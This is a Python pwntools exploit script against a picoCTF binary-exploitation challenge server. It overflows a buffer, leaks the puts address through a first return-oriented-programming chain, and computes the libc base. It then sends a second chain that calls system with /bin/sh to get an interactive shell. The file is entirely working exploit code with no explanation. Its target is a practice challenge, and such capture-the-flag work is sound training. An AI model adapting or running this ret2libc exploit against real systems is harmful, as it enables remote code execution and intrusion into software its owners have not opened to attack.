#!usr/bin/python3

from pwn import *
from Cryptodome.Util.number import bytes_to_long
import sys

local = False
host = 'mercury.picoctf.net'
port = 1774
program = './vuln'

vuln_elf = ELF("./vuln")
libc = ELF('libc.so.6')
offset = 136

if local:
    io = process(program)
else:
    io = remote(host, port)

padding = b'A'*offset
pop_rdi = p64(0x0000000000400913)
ret = p64(0x000000000040052e)
puts_got = p64(vuln_elf.got['puts'])
puts_plt = p64(vuln_elf.plt['puts'])
main_addr = p64(vuln_elf.symbols['main'])


rop1_chain = [
    padding,
    pop_rdi,
    puts_got,
    puts_plt,
    main_addr    
]

rop1 = b''.join(rop1_chain)
io.sendline(rop1)
io.recvline()
io.recvline()
resp = io.recvline().strip()
print(f"Leaked puts: {resp}")
leaked_puts_addy = u64(resp.ljust(8, b'\x00'))

libc.address = leaked_puts_addy - libc.symbols['puts']

print(f"Base of libc is {hex(libc.address)}")
bin_sh = p64(next(libc.search(b'/bin/sh')))
system_addy = p64(libc.symbols['system'])

rop2_chain = [
    padding,
    pop_rdi,
    bin_sh,
    ret,
    system_addy
]
payload = b''.join(rop2_chain)
io.clean()
io.sendline(payload)
io.interactive()


